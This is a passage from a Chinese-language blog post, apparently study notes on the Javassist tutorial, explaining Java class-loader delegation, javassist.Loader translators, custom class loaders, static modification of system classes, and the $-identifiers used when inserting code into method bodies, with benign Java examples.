<span class="title">getX</span><span class="params">()</span> </span>&#123; <span class="keyword">return</span> x; &#125;</span><br><span class="line">        :</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Box</span> </span>&#123;      <span class="comment">// 引导器是CL，但是真实加载器是PL</span></span><br><span class="line">    <span class="keyword">private</span> Point upperLeft, size;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> Point <span class="title">getSize</span><span class="params">()</span> </span>&#123; <span class="keyword">return</span> size; &#125;</span><br><span class="line">        :</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Window</span> </span>&#123;    <span class="comment">// 被CL加载</span></span><br><span class="line">    <span class="keyword">private</span> Box box;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">widthIs</span><span class="params">(<span class="keyword">int</span> w)</span> </span>&#123;</span><br><span class="line">        Point p = box.getSize();</span><br><span class="line">        <span class="keyword">return</span> w == p.getX();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>现在<code>Window</code>类的定义也引用了<code>Point</code>类，在这个案例中，CL在被请求加载<code>Point</code>时也将委托给PL。<strong><em>你必须避免存在两个不同的类加载器重复加载同一个类</em></strong>，二者中的其中一个必须委托给另外一个。 如果在<code>Point</code>加载的时候，CL没有委托给PL，<code>widthIs()</code>将会抛出一个<code>ClassCastException</code>。因为<code>Box</code>的真实加载器是PL，<code>Box</code>中引用的类<code>Point</code>类也会被PL加载。因此，<code>getSize()</code>方法返回值是PL加载的<code>Point</code>的一个实例，然而<code>getSize()</code>方法中的变量是CL加载的<code>Point</code>类型，JVM将它们视作不同的类型，所以会抛出类型不匹配的异常。</p><p>这种行为有些不方便但却是必要的,如果<code>Point p = box.getSize();</code>不会抛出异常，则<code>Window</code>的程序员就打破了<code>Point</code>类的封装性。例如，在PL加载的Point中，字段x是私有的。但是，如果CL用下面的定义加载Point(public代替private)，Window类则可以直接访问x的值。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Point</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span> x, y;    <span class="comment">// not private</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getX</span><span class="params">()</span> </span>&#123; <span class="keyword">return</span> x; &#125;</span><br><span class="line">        :</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="使用javassist-Loader"><a href="#使用javassist-Loader" class="headerlink" title="使用javassist.Loader"></a>使用javassist.Loader</h3><p>Javassist提供了一个类加载器<code>javassist.Loader</code>，这个类加载器使用<code>javassist.ClassPool</code>对象读取class文件。</p><p>例如，<code>javassist.Loader</code>可用于使用javassist修改的指定的类：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">ClassPool pool = ClassPool.getDefault();</span><br><span class="line"><span class="comment">// 使用ClassPool创建Loader</span></span><br><span class="line">Loader cl = <span class="keyword">new</span> Loader(pool);</span><br><span class="line"></span><br><span class="line">CtClass ct = pool.get(<span class="string">"org.byron4j.cookbook.javaagent.Rectangle"</span>);</span><br><span class="line">ct.setSuperclass(pool.get(<span class="string">"org.byron4j.cookbook.javaagent.Point"</span>));</span><br><span class="line"></span><br><span class="line">Class&lt;?&gt; c = cl.loadClass(<span class="string">"org.byron4j.cookbook.javaagent.Rectangle"</span>);</span><br><span class="line">Object o = c.newInstance();</span><br></pre></td></tr></table></figure><p>这个程序修改了类Rectangle类，将其父类设置为Point类，然后程序加载了修改后的Rectangle类，并且创建了一个实例。</p><p><strong>如果用户想在加载一个类的时候按需修改它，则用户可以添加一个<code>javassist.Loader</code>的事件监听器。当这个类加载器加载一个类的时候就会通知添加好的事件监听器。</strong> 事件监听器必须实现以下两个接口：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">Translator</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">start</span><span class="params">(ClassPool pool)</span> </span></span><br><span class="line"><span class="function">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onLoad</span><span class="params">(ClassPool pool, String classname)</span></span></span><br><span class="line"><span class="function">&#125;</span></span><br></pre></td></tr></table></figure><ol><li>当javassist.Loader中的addTranslator()将这个事件监听器添加到javassist.Loader对象中时，start()方法被调用。</li><li>方法onLoad()在javassist.Loader加载一个类之前被调用。onLoad()可以修改加载类的定义。</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">* Loader的观察者</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">Translator</span> </span>&#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">    * 当对象附加到加载器对象时，加载器将调用该对象进行初始化。此方法可用于获取(用于缓存)一些将在Translator的onLoad()中访问的CtClass对象。</span></span><br><span class="line"><span class="comment">    * <span class="doctag">@param</span> pool</span></span><br><span class="line"><span class="comment">    * <span class="doctag">@throws</span> NotFoundException</span></span><br><span class="line"><span class="comment">    * <span class="doctag">@throws</span> CannotCompileException</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">start</span><span class="params">(ClassPool pool)</span></span></span><br><span class="line"><span class="function">            <span class="keyword">throws</span> NotFoundException, CannotCompileException</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">    * 当Loader加载一个类时，就会通知调用该方法。Loader会在onLoad()方法返回后调用</span></span><br><span class="line"><span class="comment">    *     pool.get(classname).toBytecode()</span></span><br><span class="line"><span class="comment">    * 方法去读取class文件，classname可能是尚未创建的类的名称。</span></span><br><span class="line"><span class="comment">    * 如果这样的话，&lt;code&gt;onLoad()&lt;/code&gt;方法必须创建那个class，以便Loader可以在&lt;code&gt;onLoad()&lt;/code&gt;方法返回后读取它。</span></span><br><span class="line"><span class="comment">    * <span class="doctag">@param</span> pool</span></span><br><span class="line"><span class="comment">    * <span class="doctag">@param</span> classname</span></span><br><span class="line"><span class="comment">    * <span class="doctag">@throws</span> NotFoundException</span></span><br><span class="line"><span class="comment">    * <span class="doctag">@throws</span> CannotCompileException</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">onLoad</span><span class="params">(ClassPool pool, String classname)</span></span></span><br><span class="line"><span class="function">            <span class="keyword">throws</span> NotFoundException, CannotCompileException</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当<code>javassist.Loader</code>对象的<code>addTranslator()</code>方法添加事件监听器的时候，<code>start()</code>方法就会被调用。 <code>onLoad()</code>方法会在<code>javassist.Loader</code>加载一个类之前被调用。</p><p> 以下是这两种情况的源码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 添加事件监听器的时候，就会调用监听器的start方法</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">addTranslator</span><span class="params">(ClassPool cp, Translator t)</span> <span class="keyword">throws</span> NotFoundException, CannotCompileException </span>&#123;</span><br><span class="line">    source = cp;</span><br><span class="line">    translator = t;</span><br><span class="line">    t.start(cp);<span class="comment">//&lt;---</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 存在监听器，则在Loader的findClass方法中，先执行监听器的onLoad()方法，再通过.get(name).toBytecode()加载类</span></span><br><span class="line"><span class="keyword">if</span> (source != <span class="keyword">null</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (translator != <span class="keyword">null</span>)</span><br><span class="line">        translator.onLoad(source, name);<span class="comment">//1</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        classfile = source.get(name).toBytecode();<span class="comment">//2</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span> (NotFoundException e) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>所以，<code>translator.onLoad</code>的方法中可以修改加载的类的定义。</strong></p><p>例如，下面的事件监听器在加载之前将所有的类改为公共类。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MyTranslator</span> <span class="keyword">implements</span> <span class="title">Translator</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">start</span><span class="params">(ClassPool pool)</span></span></span><br><span class="line"><span class="function">        <span class="keyword">throws</span> NotFoundException, CannotCompileException </span>&#123;&#125;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">onLoad</span><span class="params">(ClassPool pool, String classname)</span></span></span><br><span class="line"><span class="function">        <span class="keyword">throws</span> NotFoundException, CannotCompileException</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        CtClass cc = pool.get(classname);</span><br><span class="line">        cc.setModifiers(Modifier.PUBLIC);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>请注意，onLoad()不必调用toBytecode()或writeFile()，因为javassist.Loader调用这些方法来获取类文件。</p><p>要运行一个带有MyTranslator对象的应用程序类MyApp，需要写一个主类，如下所示：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> javassist.*;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Point</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"com.sec.Point#main invoked!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main2</span> </span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Throwable </span>&#123;</span><br><span class="line">     Translator t = <span class="keyword">new</span> MyTranslator();</span><br><span class="line">     ClassPool pool = ClassPool.getDefault();</span><br><span class="line">     Loader cl = <span class="keyword">new</span> Loader();</span><br><span class="line">     cl.addTranslator(pool, t);</span><br><span class="line">     <span class="comment">// cl.run方法会运行指定MyApp的main方法</span></span><br><span class="line">     cl.run(<span class="string">"com.sec.Point"</span>, args);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">% java Main2 arg1 arg2</span><br></pre></td></tr></table></figure><p>注意：应用的类像Point是不能访问加载器的类如MyTranslator、ClassPool的，因为它们是被不同的加载器加载的。应用的类是由javassist.Loader加载，而其他的是由默认的JVM类加载器加载的。</p><p><code>javassist.Loader</code>加载类的顺序和<code>java.lang.ClassLoader</code>不同。 <code>ClassLoader</code>首先将加载操作委托给父加载器，如果父加载器找不到它们才由自身尝试加载类。 反过来说，<code>javassist.Loader</code>在委托给父加载器之前尝试加载类。只有在以下情况才去委托父加载器：</p><ul><li>类不是由<code>ClassPool.get()</code>找到的</li><li>类使用了<code>delegateLoadingOf()</code>去指定由父加载器加载。</li></ul><p>这个搜索顺序允许Javassist加载修改过的类。然而，如果加载失败的话就会委托给父加载器去加载。一旦一个类由其父加载器加载了，这个类引用的其它类也会由其父加载器加载，则这些类就不会被当前类加载器修改了。 回想一下，类C中所有引用的类都是由类C的真实加载器负责加载的。<strong><em>如果你的程序不能加载一个修改过的类，</em></strong>你应该确保所有使用该类的类都已经被<code>javassist.Loader</code>加载了。</p><h3 id="编写一个类加载器"><a href="#编写一个类加载器" class="headerlink" title="编写一个类加载器"></a>编写一个类加载器</h3><p>一个使用Javassist的简单类加载器如下，继承ClassLoader。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> javassist.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SampleLoader</span> <span class="keyword">extends</span> <span class="title">ClassLoader</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> ClassPool pool;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">SampleLoader</span><span class="params">()</span> <span class="keyword">throws</span> NotFoundException </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.pool = ClassPool.getDefault();</span><br><span class="line">        <span class="keyword">this</span>.pool.insertClassPath(<span class="string">"./target/classes"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> Class&lt;?&gt; findClass(String name) <span class="keyword">throws</span> ClassNotFoundException &#123;</span><br><span class="line">        CtClass cc;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            cc = pool.get(name);</span><br><span class="line">            <span class="comment">//TODO</span></span><br><span class="line">            <span class="keyword">byte</span>[] bb = cc.toBytecode();</span><br><span class="line">            <span class="keyword">return</span> defineClass(name,bb,<span class="number">0</span>,bb.length);</span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        SampleLoader sl = <span class="keyword">new</span> SampleLoader();</span><br><span class="line">        Class&lt;?&gt; cl = sl.loadClass(<span class="string">"com.sec.Point"</span>);</span><br><span class="line">        cl.getDeclaredMethod("main",new Class[]&#123;String[].class&#125;).invoke(null,new Object[]&#123;args&#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>假设Point是一个应用程序，为了执行这个程序，首先指定<code>./target/classes</code>为class文件目录。构造器中<code>insertClassPath()</code>方法指定了目录名称<code>./target/classes</code>，你可以使用不同的目录名称来代替你想要加载的类路径地址。 执行该程序，类加载器会加载Point类(Point.class文件)并且调用其main方法。</p><p>这是使用javassist最简单的示例。然而，如果你想编写一个更加复杂的类加载器，你需要了解更多的java类加载的机制。例如，上面的程序将Point类在命名空间与SampleLoader命名空间分开了，因为这两个是由不同的类加载器加载的。因此，Point类不能直接访问SampleLoader类。</p><h3 id="修改一个系统类"><a href="#修改一个系统类" class="headerlink" title="修改一个系统类"></a>修改一个系统类</h3><p>java.lang.String等系统类不能被系统类加载器以外的类加载器加载。因此，上图所示的SampleLoader或javassist.Loader不能在加载时修改系统类。</p><p>如果你的应用想那样去做的话（修改系统类），必须<strong><em>静态地</em></strong>修改系统类。</p><p>例如，添加一个新的属性字段给<code>java.lang.String</code>:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 添加字段给系统类：java.lang.String</span></span><br><span class="line">ClassPool pool = ClassPool.getDefault();</span><br><span class="line">CtClass ctClass = pool.get(<span class="string">"java.lang.String"</span>);</span><br><span class="line"><span class="comment">// 创建字段</span></span><br><span class="line">CtField cf = <span class="keyword">new</span> CtField(CtClass.intType, <span class="string">"hiddenValue"</span>, ctClass);</span><br><span class="line">cf.setModifiers(Modifier.PUBLIC);</span><br><span class="line"><span class="comment">//添加字段</span></span><br><span class="line">ctClass.addField(cf);</span><br><span class="line">ctClass.writeFile(<span class="string">"."</span>);</span><br></pre></td></tr></table></figure><p>这个程序产生一个文件”./java/lang/String.class”。</p><p><code>% java -Xbootclasspath/p:. MyApp arg1 arg2...</code></p><h3 id="在运行时重新加载一个类"><a href="#在运行时重新加载一个类" class="headerlink" title="在运行时重新加载一个类"></a>在运行时重新加载一个类</h3><p><strong><em>如果启动JVM时启动了JPDA</em></strong>，则一个类可以重加载。在JVM加载一个类后，旧的版本的类的定义可以卸载，新的版本可以重新加载。 换言之，类的定义可以在运行时动态修改。然而，一个新的类的定义必须与旧的类定义在某种程度上兼容。 <strong><em>JVM不允许两个版本之间更改模式。</em></strong> 它们拥有相同的方法、成员变量。</p><p>Javassist提供了一个方便的类，用于在运行时重载一个类。更多信息，请参见 javassist.tools.HotSwapper 的 API 文档。</p><h2 id="自省-amp-定制化"><a href="#自省-amp-定制化" class="headerlink" title="自省 &amp; 定制化"></a>自省 &amp; 定制化</h2><p><code>CtClass</code>提供了自省的一些方法。Javassist的内省功能和Java反射API的内省功能兼容。 <code>CtClass</code>提供了<code>getName()</code>、<code>getSuperclass()</code>、<code>getMethods()</code>等等方法。<code>CtClass</code>也提供了修改类定义的方法，允许添加一个新的成员变量、构造器、方法，也可以检测方法体。 方法由<code>CtMethod</code>对象表示。<code>CtMethod</code>提供了修改方法定义的几个方法。注意：如果一个方法继承了某个类，则CtMethod表示为是在父类中声明的方法。一个<code>CtMethod</code>对象对应一个方法声明。</p><p>例如，如果类Point声明了一个方法move()，而Point类的的一个子类ColorPoint没有覆盖move()方法，这两个move()方法即Point中声名的和ColorPoint中继承的都由相同的CtMethod对象表示。如果修改这个CtMethod对象标表示的方法的定义，则修改会表现到这两个方法上。如果你仅仅想修改ColorPoint中的该方法，你首先必须给ColorPoint添加一个表示move()方法的CtMethod的副本，可以通过<code>CtNewMethod.copy()</code>方法获得。</p><p>Javassist不允许移除一个方法或者成员变量，但是允许变更方法名。所以如果一个方法不再需要了，应该重命名并且修改为私有的：调用CtMethod中的<code>setName()</code>和<code>setModifiers()</code>方法。</p><p>Javassist不允许在一个已存在的方法中添加额外的参数，为了处理这样的变更，接受额外参数或者其他参数的新方法应该添加在同一个类中。例如，如果你想在一个方法中添加一个额外的参数：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">move</span><span class="params">(<span class="keyword">int</span> newX, <span class="keyword">int</span> newY)</span> </span>&#123; x = newX; y = newY; &#125;</span><br></pre></td></tr></table></figure><p>改成:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">move</span><span class="params">(<span class="keyword">int</span> newX, <span class="keyword">int</span> newY, <span class="keyword">int</span> newZ)</span> </span>&#123;    </span><br><span class="line">  <span class="comment">// do what you want with newZ.    </span></span><br><span class="line">  move(newX, newY); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Javassist 也提供了更低层次的API可以直接编辑原生class文件。例如,CtClass的<code>getClassFile()</code>返回一个<code>ClassFile</code>对象表示一个原生class文件。 CtMethod中的<code>getMethodInfo()</code>方法返回一个<code>MethodInfo</code>对象表示在class文件中的一个<code>method_info</code>结构。 低层次的API使用了来自JVM规范的词汇。用户必须了解class文件和字节码。更多的细节，可以参考<a href="http://www.javassist.org/tutorial/tutorial3.html#intro" target="_blank" rel="noopener">javassist.bytecode包</a>。</p><p>如果需要被修改的类包含以下以<code>$</code>开头的特殊标识符，则在运行时需要<code>javassist.runtime</code>包来支持。</p><h3 id="在方法体的前部、后部插入代码"><a href="#在方法体的前部、后部插入代码" class="headerlink" title="在方法体的前部、后部插入代码"></a>在方法体的前部、后部插入代码</h3><p><code>CtMethod</code>和<code>CtConstructor</code>提供了<code>insertBefore()</code>,<code>insertAfter()</code>和<code>addCatch()</code>方法。他们都是在已存在的方法体中插入代码段，用户可以使用Java中的<strong>源代码文本方式编写代码段</strong>。<strong>Javassist包含一个简单的Java编译器用于处理源文本，接收Java中的源文本并编译成字节码到方法体中。</strong></p><p>插入代码段在指定行也是可以的（如果行号表在class文件中的话），<code>CtMethod</code>和<code>CtConstructor</code>的<code>insertAt()</code>方法在源class文件中获取源文本和行号，它将编译源文本并且在指定行插入编译过的代码。</p><p>语句和代码块可以指的是字段和方法。特殊变量<code>$0，$1，$2，</code>…来访问方法参数。虽然允许在块中声明一个新的局部变量，但不允许访问方法中声明的局部变量。然而，<code>insertAt()</code>允许语句和代码块访问局部变量，如果这些变量在指定的行号处可用，并且目标方法是用-g选项编译的。</p><p>传递给方法<code>insertBefore()</code>、<code>insertAfter()</code>、<code>addCatch()</code>和<code>insertAt()</code>的String对象是由Javassist中包含的编译器编译的。由于编译器支持语言扩展，所以几个以$开头的标识符具有特殊的意义。</p><p><img src="../images/Javassist%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20210217231334157.png" alt="image-20210217231334157"></p><table><thead><tr><th>符号</th><th>含义</th></tr></thead><tbody><tr><td><code>$0</code>, <code>$1</code>, <code>$2</code>, …</td><td><code>this</code> and 方法的参数</td></tr><tr><td><code>$args</code></td><td>方法参数数组.它的类型为 <code>Object[]</code></td></tr><tr><td><code>$$</code></td><td>所有实参。例如, <code>m($$)</code> 等价于 <code>m($1,$2,</code>…<code>)</code></td></tr><tr><td><code>$cflow(</code>…<code>)</code></td><td><code>cflow</code> 变量</td></tr><tr><td><code>$r</code></td><td>返回结果的类型，用于强制类型转换</td></tr><tr><td><code>$w</code></td><td>包装器类型，用于强制类型转换</td></tr><tr><td><code>$_</code></td><td>返回值</td></tr><tr><td><code>$sig</code></td><td>类型为 java.lang.Class 的参数类型数组</td></tr><tr><td><code>$type</code></td><td>一个 java.lang.Class 对象，表示返回值类型</td></tr><tr><td><code>$class</code></td><td>一个 java.lang.Class 对象，表示当前正在修改的类</td></tr></tbody></table><h4 id="0-1-2"><a href="#0-1-2" class="headerlink" title="$0,$1,$2"></a><code>$0,$1,$2</code></h4><p>传递给目标方法的参数可以用<code>$1</code>，<code>$2</code>，…代替原来的参数名进行访问。1元代表第一个参数，2元代表第二个参数，以此类推。这些变量的类型与参数类型相同。<code>$0</code>相当于这样。如果方法是静态的，则<code>$0</code>不可用。</p><p>这些变量的用法如下。假设一个类Point:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Point</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> x, y;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">move</span><span class="params">(<span class="keyword">int</span> dx, <span class="keyword">int</span> dy)</span> </span>&#123; x += dx; y += dy; &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>要在调用move()方法时打印dx和dy的值，请执行这个程序：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ClassPool pool = ClassPool.getDefault(); </span><br><span class="line">CtClass cc = pool.get(<span class="string">"Point"</span>); </span><br><span class="line">CtMethod m = cc.getDeclaredMethod(<span class="string">"move"</span>); </span><br><span class="line">m.insertBefore(<span class="string">"&#123; System.out.println($1); System.out.println($2); &#125;"</span>); </span><br><span class="line">cc.writeFile();</span><br></pre></td></tr></table></figure><p>修改后的Point类的定义是这样的。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Point</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> x, y;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">move</span><span class="params">(<span class="keyword">int</span> dx, <span class="keyword">int</span> dy)</span> </span>&#123;</span><br><span class="line">        &#123; </span><br><span class="line">          System.out.println(dx); </span><br><span class="line">          System.out.println(dy); </span><br><span class="line">        &#125;</span><br><span class="line">        x += dx; y += dy;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>$1</code>和<code>$2</code>分别由dx和dy代替。</p><p><code>$1</code>, <code>$2</code>, <code>$3</code> …是可以更新的。如果变量值更改了，那么参数的值也会更新。</p><h4 id="args"><a href="#args" class="headerlink" title="$args"></a><code>$args</code></h4><p>变量<code>$args</code>表示<strong>装载所有参数的参数数组</strong>。该变量的类型是一个Object类的数组。如果一个参数类型是一个基本类型，比如int，那么参数值就会被转换为一个包装对象，比如java.lang.Integer来存储在<code>$args</code>中。因此，<code>$args[0]</code>相当于<code>$1</code>，除非第一个参数的类型是一个基本类型。请注意，<code>$args[0]</code>并不等同于​<code>$0</code>，<code>$0</code>代表了<code>this</code>。</p><p>如果一个Object数组被分配给$args，那么该数组的每个元素都被分配给每个参数。如果一个参数类型是基本类型，那么对应元素的类型必须是封装类型。在将值分配给参数之前，会将其从封装类型转换为基本类型。</p><h4 id><a href="#" class="headerlink" title="$$"></a><code>$$</code></h4><p>变量 $$ 是所有参数列表的缩写，用逗号分隔。 例如，如果方法 move() 的有 3 个参数，则</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">move($$) == move($<span class="number">1</span>, $<span class="number">2</span>, $<span class="number">3</span>)</span><br><span class="line">exMove($$, context) == exMove($<span class="number">1</span>, $<span class="number">2</span>, $<span class="number">3</span>, context)</span><br></pre></td></tr></table></figure><p>如果move()不接受任何参数，那么move($$)相当于move()。</p><p>请注意，$$使方法调用的通用符号与参数数量相关。它通常与后面的$proceed一起使用。</p><h4 id="cflow"><a href="#cflow" class="headerlink" title="$cflow"></a><code>$cflow</code></h4><p>$cflow的意思是 “控制流”。这个只读变量返回特定方法的递归调用深度。</p><p>假设下面所示的方法由CtMethod对象cm表示：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span 